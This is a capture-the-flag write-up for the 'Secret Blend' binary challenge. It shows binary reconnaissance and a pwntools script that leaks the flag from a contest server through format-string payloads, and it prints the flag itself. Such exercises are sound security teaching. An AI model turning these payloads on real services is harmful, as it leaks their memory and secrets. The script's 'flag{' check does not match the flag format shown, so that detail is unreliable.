# !Kogarashi CafÃ© - The Secret Blend  

**Category:** Binary Exploitation  

A challenge where not everything on the menu is meant to be seen. We exploit a format string vulnerability to leak the flag.  

---

### Challenge  

**Provided File:** `secret_blend`  

---

## Overview  

1. **Analyzing the Binary**  
   - Use `file secret_blend` to determine its type:  
     ```sh
     file secret_blend  
     ```
     Output:  
     ```
     ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, not stripped
     ```
   - Running `strings secret_blend` reveals a key hint:  
     ```
     Barista: 'The special blend is missing...
     ```
   - Using `objdump` to disassemble the binary:  
     ```sh
     objdump -d secret_blend > disassembly.txt  
     ```
  
2. **Identifying the Vulnerability**  
   - Since the program is dynamically linked and not stripped, it suggests potential security weaknesses.  
   - The presence of format string specifiers (`%s`, `%x`, `%p`) hints at an exploit where we can leak memory.  
   - The goal is to extract the flag using a format string vulnerability.  

---

## Exploiting Format String Vulnerability  

1. **Understanding the Input Handling**  
   - The binary takes user input, likely without proper format string sanitization.  
   - If the input is directly passed to `printf()`, it allows us to leak stack values.  

2. **Testing Format String Leaks**  
   - We test various offsets to determine where the flag is located in memory:  
     ```sh
     nc chals1.apoorvctf.xyz 3003
     ```
     - Sending `%p` multiple times helps identify memory leaks.  
     - If `%x`, `%s`, or `%p` print useful addresses, we can refine our payload.  

3. **Automating the Exploit**  
   - A Python script using `pwntools` was written to automate the process.  
   - The script iterates over possible offsets (`%1$s`, `%2$s`, etc.) until the flag appears.  

---

## Exploit Script  

```python
#!/usr/bin/env python3
from pwn import *

def test_offset(offset):
    try:
        # Connect to the remote server
        p = remote("chals1.apoorvctf.xyz", 3003)
        # Wait until the prompt appears
        p.recvuntil(b"What will you have?")
        # Construct the payload using format string exploitation
        payload = f"%{offset}$s".encode()
        p.sendline(payload)
        # Read the full response
        response = p.recvall(timeout=2)
        p.close()
        return response
    except EOFError:
        return b""

def main():
    flag = None
    # Try different offsets to find the flag
    for offset in range(1, 16):
        response = test_offset(offset)
        print(f"Offset {offset}: {response}")
        if b"flag{" in response:
            flag = response
            log.success("Flag found: " + flag.decode(errors="ignore"))
            break
    if flag is None:
        log.error("Flag not found. Adjust the offset range if needed.")

if __name__ == "__main__":
    main()
```

---

## Flag Found  

**Flag:** `apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}`  

By leveraging the format string vulnerability, we successfully extracted the flag from memory.
